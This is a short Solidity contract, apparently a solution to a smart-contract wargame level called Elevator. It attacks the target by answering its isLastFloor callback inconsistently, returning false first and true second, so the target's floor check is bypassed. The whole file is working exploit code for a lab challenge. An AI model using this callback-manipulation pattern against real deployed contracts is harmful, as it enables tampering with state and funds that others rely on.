// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    uint256 flag = 0;
    IElevator target;

    constructor(address _targetAddress) {
        target = IElevator(_targetAddress);
    }

    function isLastFloor(uint256) public returns (bool) {
        return ((++flag) % 2 == 0);
    }

    function attack(uint256 _floor) public {
        target.goTo(_floor);
    }
}
